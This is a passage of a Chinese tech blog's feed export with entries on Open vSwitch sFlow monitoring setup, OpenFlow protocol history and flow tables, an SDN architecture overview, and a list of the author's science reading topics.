<li>启动分析器 sFlow Analyzer (以 sFlow-RT 为例)</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">$ cd sflow-rt</span><br><span class="line">$ ./start.sh</span><br><span class="line">bash<span class="number">-3.2</span>$ ./start.sh</span><br><span class="line">信息: Listening, sFlow port <span class="number">6343</span></span><br><span class="line">信息: Listening, HTTP port <span class="number">8008</span></span><br><span class="line">信息: app/ovs/scripts/status.js started</span><br><span class="line">警告: app/ovs/scripts/status.js app/ovs/scripts/status.js</span><br><span class="line">信息: app/ovs/scripts/status.js stopped</span><br><span class="line">$ ps -ef | grep <span class="number">6343</span></span><br><span class="line">  <span class="number">501</span> <span class="number">30565</span> <span class="number">30431</span>   <span class="number">0</span>  <span class="number">2</span>:<span class="number">45</span>下午 ttys002    <span class="number">0</span>:<span class="number">03.90</span> /usr/bin/java -Xms200M -Xmx200M -XX:+UseG1GC -XX:MaxGCPauseMillis=<span class="number">100</span> -Dsflow.port=<span class="number">6343</span> -Dhttp.port=<span class="number">8008</span> -jar ./lib/sflowrt.jar</span><br></pre></td></tr></table></figure>
<ul>
<li>Connect Normal Switch to sFlow Analyzer</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 指定 analyzer</span></span><br><span class="line"><span class="keyword">switch</span>(root)# sflow collector <span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line"><span class="comment">// 数据包采样: 1-in-4096</span></span><br><span class="line"><span class="comment">// 常规参考值：[100 Mb/s: 1 in 500]、[1 Bb/s: 1 in 1000]、[10 Gb/s: 1 in 2000]</span></span><br><span class="line"><span class="keyword">switch</span>(root)# sflow sampling <span class="number">4096</span></span><br><span class="line"><span class="comment">// 轮询计数器 polling counters every 20 seconds</span></span><br><span class="line"><span class="keyword">switch</span>(root)# sflow polling <span class="number">20</span></span><br><span class="line"><span class="keyword">switch</span>(root)# sflow enable</span><br></pre></td></tr></table></figure>
<ul>
<li>Connect Open vSwitch to sFlow Analyzer</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// e.g. connect Open vSwitch to sFlow analyzer</span></span><br><span class="line">ovs-vsctl — –id=@sflow create sflow agent=eth0 \target=\”<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6343</span>\” sampling=<span class="number">1000</span> polling=<span class="number">20</span> \</span><br><span class="line">— set bridge br0 sflow=@sflow</span><br></pre></td></tr></table></figure>
<h4 id="4-2-Connect-Open-vSwitch-to-OpenFlow-controller"><a href="#4-2-Connect-Open-vSwitch-to-OpenFlow-controller" class="headerlink" title="4.2 Connect Open vSwitch to OpenFlow controller"></a>4.2 Connect Open vSwitch to OpenFlow controller</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// e.g. connect Open vSwitch to OpenFlow controller</span></span><br><span class="line">ovs-vsctl set-controller br0 tcp:<span class="number">10.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6633</span></span><br></pre></td></tr></table></figure>
<h4 id="4-3-Traffic-analytics-sFlow-vs-NetFlow"><a href="#4-3-Traffic-analytics-sFlow-vs-NetFlow" class="headerlink" title="4.3 Traffic analytics : sFlow vs NetFlow"></a>4.3 Traffic analytics : sFlow vs NetFlow</h4><ul>
<li>sFlow does not use flow cache, so realtime charts more accurately reflect traffic trend</li>
<li>NetFlow spikes caused by flow cache active-timeout for long running connections</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SDV-OVS-sFlow-NetFlow.png" alt=""></p>
<h4 id="应用案例"><a href="#应用案例" class="headerlink" title="应用案例"></a>应用案例</h4><ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzAxNDU2MTU5MA==&amp;mid=208243964&amp;idx=1&amp;sn=161fdc0288aa36a93ca34d488f321b88&amp;scene=1#rd">传统券商的互联网技术之路——泛前端、交易云与金融电商</a></li>
</ul>
<h2 id="News"><a href="#News" class="headerlink" title="News"></a>News</h2><h4 id="Open-vSwitch-Enable-OpenFlow-1-5-by-default-25-Apr-2017"><a href="#Open-vSwitch-Enable-OpenFlow-1-5-by-default-25-Apr-2017" class="headerlink" title="Open vSwitch: Enable OpenFlow 1.5 by default | 25 Apr 2017"></a>Open vSwitch: Enable OpenFlow 1.5 by default | 25 Apr 2017</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">===================== ===== ===== ===== ===== ===== =====</span><br><span class="line">Open vSwitch          OF1<span class="number">.0</span> OF1<span class="number">.1</span> OF1<span class="number">.2</span> OF1<span class="number">.3</span> OF1<span class="number">.4</span> OF1<span class="number">.5</span></span><br><span class="line">===================== ===== ===== ===== ===== ===== =====</span><br><span class="line"><span class="number">1.9</span> and earlier        yes   ---   ---   ---   ---   ---</span><br><span class="line"><span class="number">1.10</span>, <span class="number">1.11</span>             yes   ---   (*)   (*)   ---   ---</span><br><span class="line"><span class="number">2.0</span>, <span class="number">2.1</span>               yes   (*)   (*)   (*)   ---   ---</span><br><span class="line"><span class="number">2.2</span>                    yes   (*)   (*)   (*)   (%)   (*)</span><br><span class="line"><span class="number">2.3</span>, <span class="number">2.4</span>               yes   yes   yes   yes   (*)   (*)</span><br><span class="line"><span class="number">2.5</span>, <span class="number">2.6</span>, <span class="number">2.7</span>          yes   yes   yes   yes   (*)   (*)</span><br><span class="line"><span class="number">2.8</span>, <span class="number">2.9</span>, <span class="number">2.10</span>, <span class="number">2.11</span>   yes   yes   yes   yes   yes   (*)</span><br><span class="line"><span class="number">2.12</span>                   yes   yes   yes   yes   yes   yes</span><br><span class="line">===================== ===== ===== ===== ===== ===== =====</span><br></pre></td></tr></table></figure>
<h2 id="前沿"><a href="#前沿" class="headerlink" title="前沿"></a>前沿</h2><ul>
<li><a href="https://developers.redhat.com/blog/2017/06/06/open-vswitch-overview-of-802-1ad-qinq-support/">Open vSwitch: Overview of 802.1ad (QinQ) Support</a></li>
<li><a href="https://developers.redhat.com/blog/2017/06/27/open-vswitch-qinq-performance/">Open vSwitch: QinQ Performance</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="SDN技术专题"><a href="#SDN技术专题" class="headerlink" title="SDN技术专题"></a>SDN技术专题</h4><ul>
<li><a href="https://riboseyim.com/2017/05/12/SDN/">SDN 技术指南（一）: 架构概览</a></li>
<li><a href="https://riboseyim.com/2017/08/22/SDN-OpenFlow/">SDN 技术指南（二）：OpenFlow</a></li>
<li>Preview <a href="https://riboseyim.com/2017/10/16/SDN-Controller/">SDN 技术指南（三）：SDN Controller</a></li>
<li><a href="https://riboseyim.com/2017/10/13/SDN-OpenvSwitch/">SDN 技术指南（四）：Open vSwitch</a></li>
<li>Preview <a href="https://riboseyim.com/2019/06/07/SDN-NFV">SDN 技术指南（五）：NFV</a></li>
<li>Preview <a href="#">SDN 技术指南（六）：OpenStack or Kubernetes ? </a></li>
<li>Preview <a href="#">SDN 技术指南（七）：标准化组织</a></li>
<li>Preview <a href="#">SDN 技术指南（八）：案例教学</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-MOOC/">SDN技术指南（十）：在线课程推荐</a></li>
</ul>
<h4 id="网络编程专题"><a href="#网络编程专题" class="headerlink" title="网络编程专题"></a>网络编程专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">网络数据包的捕获与分析（libpcap、BPF及gopacket）</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
</ul>
<h4 id="网络安全专题"><a href="#网络安全专题" class="headerlink" title="网络安全专题"></a>网络安全专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security|香港拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h4 id="云计算专题"><a href="#云计算专题" class="headerlink" title="云计算专题"></a>云计算专题</h4><ul>
<li><a href="https://riboseyim.com/2017/07/23/CloudComputing/">AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://hustcat.github.io/an-introduction-to-ovs-architecture/">An Introduction to OVS Architecture | YY哥</a></li>
<li><a href="http://hustcat.github.io/ovs-flow-table-in-datapath/">OVS 流表原理 | YY哥</a></li>
<li><a href="https://kontrolissues.net/2015/10/21/installing-openswitch/">kontrolissues:Installing OpenSwitch</a></li>
<li><a href="http://www.sdnlab.com/sdn-guide/14747.html">OVS初级教程：使用Open vSwitch构建虚拟网络</a></li>
<li><a href="https://www.ibm.com/developerworks/cn/cloud/library/1401_zhaoyi_openswitch/">基于 Open vSwitch 的 OpenFlow 实践 | IBM@developerworks,2014</a></li>
<li><a href="http://openvswitch.org/support/ovscon2016/7/1120-tu.pdf">Offloading OVS Flow Processing using eBPF | William (Cheng-Chun) Tu VMware | OVS Conference 2016</a></li>
<li><a href="http://openvswitch.org/support/ovscon2014/17/1400-ovs-sflow.pdf">Traffic visibility and control with sFlow | Peter Phaal InMon Corp. November 2014</a></li>
<li><a href="https://networkheresy.com/2014/11/13/accelerating-open-vswitch-to-ludicrous-speed/">Accelerating Open vSwitch to “Ludicrous Speed” | Network Heresy , 2014 </a></li>
<li><a href="http://blog.sflow.com/2015/09/open-virtual-network-ovn.html">Open Virtual Network (OVN) | sflow.com ,2015 </a></li>
<li><a href="http://openvswitch.org/support/ovscon2014/">Open vSwitch 2014 Fall Conference </a></li>
<li><a href="http://openvswitch.org/support/ovscon2015/">Open vSwitch 2015 Fall Conference </a></li>
<li><a href="http://openvswitch.org/support/ovscon2015/">Open vSwitch 2016 Fall Conference </a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title>自然科学 | Overview of Nature</title>
    <url>/2016/05/02/Science/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>研究成果：<a href="https://riboseyim.github.io/2017/09/04/Addiction-Decision/" target="_blank" rel="noopener">嗑药简史：关于瘾品，成瘾机制及其历史|201709</a></li>
</ul>
<a id="more"></a>
<h4 id="一、选题：《神经生物学》（From-Neuron-to-Brain-FIFTH-EDITION）"><a href="#一、选题：《神经生物学》（From-Neuron-to-Brain-FIFTH-EDITION）" class="headerlink" title="一、选题：《神经生物学》（From Neuron to Brain FIFTH EDITION）"></a>一、选题：《神经生物学》（From Neuron to Brain FIFTH EDITION）</h4><ul>
<li>1.1 立项时间：2016年初</li>
<li>1.2 研究成果:<a href="https://riboseyim.github.io/2017/09/04/Addiction-Decision/" target="_blank" rel="noopener">嗑药简史：关于瘾品，成瘾机制及其历史|201709</a></li>
<li>什么是瘾？成瘾分类：物质成瘾、行为成瘾</li>
<li>药物成瘾：管制药品及毒品、宗教致幻剂、酒精和烟草</li>
<li>行为成瘾：饮食、性行为、运动、暴力和战争</li>
<li>瘾的形成机制：奖赏路径和神经递质（多巴胺、肾上腺素、内啡肽和催产素）</li>
</ul>
<h4 id="1-3-研究成果-嗑药简史：扰动大国外交的China-Girl"><a href="#1-3-研究成果-嗑药简史：扰动大国外交的China-Girl" class="headerlink" title="1.3 研究成果:嗑药简史：扰动大国外交的China Girl"></a>1.3 研究成果:<a href="https://riboseyim.github.io/2017/11/06/Addiction-Decision-Fentanyl/" target="_blank" rel="noopener">嗑药简史：扰动大国外交的China Girl</a></h4><ul>
<li>一、什么是芬太尼（Fentanyl）：从天使到魔鬼</li>
<li>二、大国外交的头等优先事项</li>
<li>三、预测：暗黑幽灵无国界</li>
</ul>
<h4 id="二、选题：《医学》"><a href="#二、选题：《医学》" class="headerlink" title="二、选题：《医学》"></a>二、选题：《医学》</h4><ul>
<li>1.1 立项时间：201710</li>
<li>1.2 研究成果：<a href="https://riboseyim.github.io/2017/07/19/Medicine-Hepar/" target="_blank" rel="noopener">肝系统健康状态评价指标体系</a></li>
<li>1.3 <a href="https://riboseyim.github.io/2018/05/14/Addiction-Decision-Coffee/" target="_blank" rel="noopener">嗑药简史（四）：咖啡上瘾，喝还是不喝？</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/aUOOXu34NqQ5l-HJBaWwFQ" target="_blank" rel="noopener">曹则贤研究员在2017年中科院物理所研究生开学典礼上的致辞</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Science</tag>
      </tags>
  </entry>
  <entry>
    <title>SDN 技术指南（二）：OpenFlow</title>
    <url>/2017/08/22/SDN-OpenFlow/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>OpenFlow 简史（SDN != OpenFlow ; 版本问题）</li>
<li>OpenFlow 工作原理</li>
<li>OpenFlow is a communications protocol</li>
<li>支持 OpenFlow 的开源交换机：Open vSwitch</li>
</ul>
<span id="more"></span>
<h4 id="回顾-SDN-技术指南（一）：架构概览"><a href="#回顾-SDN-技术指南（一）：架构概览" class="headerlink" title="回顾 SDN 技术指南（一）：架构概览"></a>回顾 <a href="https://riboseyim.github.io/2017/05/12/SDN/">SDN 技术指南（一）：架构概览</a></h4><ul>
<li>Background：为什么需要 SDN</li>
<li>SDN的主要解决方案</li>
<li>SDN的整体应用架构</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SDN_Theme.png" alt=""></p>
<h2 id="History-OpenFlow-SDN"><a href="#History-OpenFlow-SDN" class="headerlink" title="History: OpenFlow != SDN"></a>History: OpenFlow != SDN</h2><p>OpenFlow 最早由斯坦福大学提出，目前知识产权由开放网络基金会（Open Networking Foundation，ONF)持有。<br>SDN 和 OpenFlow 两个概念经常会被混淆和误读。这也难怪，从历史上看，两者还这是你中有我、我中有你。首先，作为一个开放的协议，OpenFlow 协议是众多 SDN 控制器解决方案的实现基础；另外，定义 SDN 概念和架构背后的许多重要人物开始在 OpenFlow 领域取得了突破，进而推动 SDN 概念走向成熟。</p>
<blockquote>
<p>OpenFlow is a key protocol in many SDN solutions.</p>
</blockquote>
<p>在传统的网络交换设备中，转发平面（通常采用专门的芯片以提高性能）与控制平面（分布地部署在网络的各个节点）是紧密耦合的，被集成实现在单独的设备中。当然，从另一个角度看这样的设计也有合理性，至少能提高单个节点的灵活性和容灾能力。但是众多厂商各自为政，更出于技术保密、保持市场的考虑，对于开放接口供用户调用、建立行业标准的兴趣不大。OpenFlow 协议的推出突破了传统壁垒，有利于增加用户侧的话语权，所以 Google、Facebook 等企业是 OpenFlow 协议最坚强的拥趸，他们的数据中心都在使用 OpenFlow 协议，并倡议发起成立 ONF 来推动这个技术。</p>
<ul>
<li>1995: Sun Microsystems 在1995年就提出软件定义网络的概念（在公开 JAVA 编程语言之后不久）</li>
<li>2006: <a href="https://en.wikipedia.org/wiki/Martin_Casado">Martin Casado</a>(a PhD students at Stanford)及其团队首次提出了一个集中式安全控制的框架</li>
<li>2008: OpenFlow paper <a href="http://yuba.stanford.edu/~casado/mcthesis.pdf">《Architectural Support for Security Management in Enterprise Networks》</a> （人物： <strong>Nick McKeown</strong> 、<strong>Scott Shenker</strong> 、<strong>Dan Boneh</strong>）</li>
<li>2009: Stanford 发布 OpenFlow V1.0.0 ; <a href="https://en.wikipedia.org/wiki/Martin_Casado">Martin Casado</a> co-founds Nicira （主导 Open vSwitch）</li>
<li>2010: Guido Appenzeller co-founds Big Switch Networks (head of clean slate lab at Stanford)</li>
<li>2011: <strong>Open Networking Foundation</strong> is formed</li>
<li>Oct 2011: First Open Networking Summit.</li>
<li>July 2012: VMware buys Nicira for $1.26B</li>
<li>Nov 6, 2013: Cisco buys Insieme for $838M</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SDN_Paper_OpenFlow_Page88.png" alt=""></p>
<h4 id="OpenFlow-的版本问题"><a href="#OpenFlow-的版本问题" class="headerlink" title="OpenFlow 的版本问题"></a>OpenFlow 的版本问题</h4><p>OpenFlow 协议简单来说就是把路由器的控制平面（Control Plane，管理路由表、负责网络配置和系统管理等）从转发平面（Forward Plane，转发决策和输出链路调度等）中分离出来，以软件方式实现。从第一个正式商用版本 v1.0 开始，OpenFlow 有先后推出了v1.1,v1.2,v1.3,v1.4 等，版本之间存在不兼容的内容， OpenFlow 交换机或者其它解决方案也存在版本支持不尽相同的情况，版本兼容的问题需要尤其关注。</p>
<ul>
<li>OpenFlow V1.0 (2009)</li>
<li><p>OpenFlow V1.1 (2011)<br><strong>Ethernet/IP only</strong>. <strong>Single Flow Table</strong>. Did not cover MPLS, Q-in-Q, ECMP, and efficient Multicast.</p>
</li>
<li><p>OpenFlow V1.2 (2011)<br><strong>IPv6 Support</strong>: Matching fields include IPv6 source address, destination address, protocol number, traffic class. ICMPv6 type, ICMPv6 code, IPv6 neighbor discovery header fields, and IPv6 flow labels.<br>TLV Matching<br><strong>Multiple controller</strong></p>
</li>
<li><p>OpenFlow V1.3 (2012)<br>IPv6 extension headers: Can check if Hop-by-hop, Router, Fragmentation, Destination options, Authentication, Encrypted Security Payload (ESP), unknown extension headers are present<br>MPLS Bottom-of-Stack bit matching<br>MAC-in-MAC<br><strong>Multiple channels</strong> between switch and controller</p>
</li>
<li><p>OpenFlow V1.4 (2013)<br>Optical ports: Configure and monitor transmit and receive frequencies of lasers and their power<br>Improved Extensibility: Type-Length-Value (TLV) encodings at most places<br>Extended Experimenter Extension API: Can easily add ports, tables, queues, instructions, actions, etc.</p>
</li>
</ul>
<h2 id="OpenFlow的工作原理"><a href="#OpenFlow的工作原理" class="headerlink" title="OpenFlow的工作原理"></a>OpenFlow的工作原理</h2><blockquote>
<p>OpenFlow is a communications protocol.</p>
</blockquote>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SDN_OpenFlow_Workflow.png" alt=""></p>
<p>OpenFlow 提供了一个在 SDN 控制器和网络设备（如交换机）之间通讯的标准协议。他允许由 SDN 控制器下发到转发规则（forwarding rules）、安全规则（security rules）到底层网络交换机，完成路由决策、流量控制。OpenFlow 协议相当于一种共同语言，所以SDN 控制器和交换机都需要实现OpenFlow 协议，以便他们能够理解 OpenFlow 消息（message）。</p>
<p>SDN 控制器和交换机之间需要建立通讯连接才能进行配置、管理和监控。通讯连接基于 TCP （或者 TLS）协议之上，监听 6653 端口 。初始化模式：1）网络交换机发起，发送连接请求到控制器 2）控制器发起，交换机需要设置被动模式（ passive mode）开启监听。 无论使用哪种模式，一旦通讯连接建立，OpenFlow 消息将通过 TCP／TLS 连接传递。</p>
<p>基于 OpenFlow 消息，该协议还可以支持网络交换机监控：为了监控网络交换机，OpenFlow 协议提供了从交换机抓取网络统计信息、事件消息的请求／响应报文，方便控制器获得从交换机一侧感知人工操作和失败信息的能力,包括流移除事件，端口状态 UP/DOWN 变化等。为了能够支持第三方厂商可以在 OpenFlow 交换机上执行特定的任务，OpenFlow 协议提供可扩展的自定义消息结构，允许控制器和交换机之间传递信息。那是怎样的 OpenFlow 被许多SDN应用程序用来提供简单的网络控制和管理解决方案。</p>
<h4 id="流表（Flow-Table）"><a href="#流表（Flow-Table）" class="headerlink" title="流表（Flow Table）"></a>流表（Flow Table）</h4><p>网络交换机将 SDN 控制器下发的所有规则存储于流表（flow table），例如：</p>
<ul>
<li>ACL 策略（configuring ACL rules）</li>
<li>安全策略（security policy rules）</li>
<li>QoS 限速策略（QoS rate limiting bandwidth rules）</li>
<li>路由策略（routing rules）</li>
<li>端口镜像策略（port mirroring rules）</li>
<li>包变更策略（packet modification rules）</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SDN_OpenFlow_Packet_Capture.png" alt=""><br><img src="http://riboseyim-qiniu.riboseyim.com/SDN_OpenFlow_Packet_Capture_Mod.png" alt=""></p>
<p>大体上，流（flow）中包含三种类型的信息：</p>
<ol>
<li>Match fields：他们将定义在包头字段：L2（源目的地 以太网地址，VLAN ID，VLAN优先级等），L3（IPv4和IPv6 源目的地 地址、协议类型、DSCP、等），L4领域（TCP/UDP/SCTP源目的端口），ARP ICMP字段，字段，MPLS域等等。</li>
<li>Actions：他们将定义一个包是否符合特定条件。例如丢弃（drop），转发到交换机的指定端口，修改数据包（push/pop VLAN ID，push/pop 标签，递增/递减IP TTL），转发到特殊端口的序列等。</li>
<li>计数器：记录由多少数据包匹配到当前flow</li>
</ol>
<p>OpenFlow 协议定义了多种消息来完成交换机和控制机通讯，例如：</p>
<ul>
<li>连接设置消息（connection setup messages)</li>
<li>配置消息（configuration messages)</li>
<li>交换机统计信息消息（switch statistics messages)</li>
<li>连接监测消息（keep-alive messages)</li>
<li>异步事件消息（asynchronous events messages)</li>
<li>发生错误消息（error messages)</li>
</ul>
<h2 id="支持-OpenFlow-的开源交换机：Open-vSwitch"><a href="#支持-OpenFlow-的开源交换机：Open-vSwitch" class="headerlink" title="支持 OpenFlow 的开源交换机：Open vSwitch"></a>支持 OpenFlow 的开源交换机：Open vSwitch</h2><blockquote>
<p>OpenFlow Switches including Open vSwitch.</p>
</blockquote>
<p>市场中支持 OpenFlow 的硬件交换机包括 VMware 推出的vSwitch、vDS等虚拟交换机，Cisco与VMware合作发布了基于VMware kernel API开发的分布式虚拟交换机Nexus 1000V（功能对应于VMware的vDS），Citrix 迫于Open vSwitch快速追赶，推出了的Distributed Virtual Switch解决方案，这些方案都是收费的。</p>
<p>除了硬件交换机还可以通过软件支持并实现虚拟机互联，Open vSwitch(Open Source Virtual Switch)就是是一款基于软件实现的开源虚拟交换机。它采用 C 语言编写，遵循 Apache 2.0 许可。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/SDN_OpenvSwitch.jpg" alt=""></p>
<p>Open vSwitch 的周边生态情况：</p>
<ul>
<li>支持的操作系统（Linux, Ubuntu, Debian，FreeBSD 和 NetBSD）</li>
<li>支持云计算平台管理系统集成，例如：OpenStack, openQRM, OpenNebula, 和 oVirt</li>
<li>支持虚拟化部署，共享硬件资源（ hypervisor ）</li>
<li>支持云平台 Xen XenServer 6.0 ，也支持 Proxmox VE, VirtualBox, Xen KVM</li>
<li>提供开发工具包：Data Plane Development Kit (DPDK)</li>
<li>接口编程语言支持：C 、Python</li>
<li>支持虚拟机通讯／监控流量统计信息，例如 NetFlow(Cisco，RFC 3954)、sFlow（RFC 3176）、NetStream（Huawei）、IPFIX（RFC 7011）,详见 <a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a> 。</li>
<li>SPAN（Switched Port Analyzer ）, RSPAN（ Remote Switch Port Analyzer）：可以发送一份流量的拷贝给连接安全设备的交换机端口</li>
</ul>
<p>示例：Open vSwitch 通过命令和控制器建立初始化连接（TCP），控制器 IP （192.168.56.101） 端口（6653）：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ovs-vsctl set-controller &lt;sampleBridgeName&gt; tcp:192.168.56.101:6653</span><br></pre></td></tr></table></figure></p>
<p>Intel 拥有一个自己的 Open vSwitch 版本，OpenStack 在2011年启动 Quantum 项目，通过引入了Open vSwitch 发展 Open Stack Network 。随着 OpenStack 社区的快速壮大，Open vSwitch 在虚拟交换机的领先优势逐步确立。</p>
<h2 id="Discuss"><a href="#Discuss" class="headerlink" title="Discuss"></a>Discuss</h2><ul>
<li><a href="https://gigaom.com/2012/04/17/googles-next-openflow-challenge-taking-sdns-to-the-consumer/">资讯 | Google’s next OpenFlow challenge: taking SDNs to the consumer,Stacey Higginbotham Apr 17, 2012</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="SDN技术专题"><a href="#SDN技术专题" class="headerlink" title="SDN技术专题"></a>SDN技术专题</h4><ul>
<li><a href="https://riboseyim.com/2017/05/12/SDN/">SDN 技术指南（一）: 架构概览</a></li>
<li><a href="https://riboseyim.com/2017/08/22/SDN-OpenFlow/">SDN 技术指南（二）：OpenFlow</a></li>
<li><a href="https://riboseyim.com/2017/10/16/SDN-Controller/">SDN 技术指南（三）：SDN Controller</a></li>
<li><a href="https://riboseyim.com/2017/10/13/SDN-OpenvSwitch/">SDN 技术指南（四）：Open vSwitch</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-NFV">SDN 技术指南（五）：NFV</a></li>
<li><a href="#">SDN 技术指南（六）：OpenStack or Kubernetes ? </a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-ORG/">SDN 技术指南（七）：标准化组织</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-CASE">SDN 技术指南（八）：案例教学</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-MOOC/">SDN技术指南（十）：在线课程推荐</a></li>
</ul>
<h4 id="网络编程专题"><a href="#网络编程专题" class="headerlink" title="网络编程专题"></a>网络编程专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">网络数据包的捕获与分析（libpcap、BPF及gopacket）</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
</ul>
<h4 id="网络安全专题"><a href="#网络安全专题" class="headerlink" title="网络安全专题"></a>网络安全专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security|香港拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h4 id="云计算专题"><a href="#云计算专题" class="headerlink" title="云计算专题"></a>云计算专题</h4><ul>
<li><a href="https://riboseyim.com/2017/07/23/CloudComputing/">AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://www.youtube.com/watch?v=l25Ukkmk6Sk">David Mahler: Introduction to OpenFlow | Youtube</a></li>
<li><a href="https://www.opennetworking.org/wp-content/uploads/2013/05/TR-535_ONF_SDN_Evolution.pdf">TR-535 ONF SDN Evolution,VERSION 1.0,2016-09-08</a></li>
<li><a href="https://www.opennetworking.org/wp-content/uploads/2014/10/openflow-switch-v1.5.1.pdf">TS-025 ONF OpenFlow Switch Specification-Version 1.5.1 (Protocol version 0x06),March 26,2015</a></li>
<li><a href="https://www.linkedin.com/in/tarun-thakur-36b67a19/">Tarun Thakur</a></li>
<li><a href="https://www.howtoforge.com/tutorial/software-defined-networking-sdn-explained-for-beginners/">Software Defined Networking (SDN) explained for beginners</a></li>
<li><a href="https://www.howtoforge.com/tutorial/software-defined-networking-sdn-architecture-and-role-of-openflow/">Software Defined Networking (SDN) - Architecture and role of Openflow</a></li>
<li><a href="https://www.ibm.com/developerworks/cn/cloud/library/1401_zhaoyi_openswitch/">基于 Open vSwitch 的 OpenFlow 实践 | IBM@developerworks,2014</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title>SDN 技术指南（一）：架构概览</title>
    <url>/2017/05/12/SDN/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Background：为什么需要 SDN</li>
<li>SDN的主要解决方案</li>
<li>SDN的整体应用架构</li>
<li>SDN与网络安全</li>
<li>OpenFlow工作原理</li>
<li>OpenFlow在SDN架构中的角色</li>
</ul>
<span id="more"></span>
<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>软件定义网络（Software-defined networking，SDN），一种新的网络架构。SDN 提出的控制与转发平面分离、网络状态集中控制、支持软件编程等理念并不是什么新鲜事，但是长久以来一直没有非常突破性的进展。</p>
<blockquote>
<p>“为了让系统更好地工作，早期需要管理复杂性而后期需要提取简单性。” —唐·诺曼（Donald Arthur Norman）</p>
</blockquote>
<p>目前 SDN 引起广泛关注得益于网络需求侧翻天覆地的变化：云计算业务（服务器虚拟化技术为代表）成为主流，移动互联网催生的大数据技术日益普及，包括网络在内的资源快速配置、弹性扩容、按需调用需求强烈。传统模式的弊端显现：网络设备硬件、操作系统和网络应用三部分紧耦合在一起，组成一个封闭系统，这三部分相互依赖、每一部分的创新和演进都要求其余部分做出同样的升级。</p>
<p>越来越多的网络新协议和新算法使得网络控制平面变得越来越复杂，但是现在的网络用户却对网络的易用性有更高的要求，希望网络具有更多的可编程能力，从而自动化、智能化网络管理。正如 SDN 的倡导者 <a href="https://en.wikipedia.org/wiki/Scott_Shenker">Scott Shenker,U.C. Berkeley Professor</a> 所言，网络发展目前还处于“管理复杂性”阶段，这样的架构严重阻碍了网络创新进程的开展。</p>
<h2 id="SDN-Solutions"><a href="#SDN-Solutions" class="headerlink" title="SDN Solutions"></a>SDN Solutions</h2><p>如何解决从“管理复杂性”阶段转变到“提取简单性”阶段呢？最先取得成功商用经验的是互联网企业Google。</p>
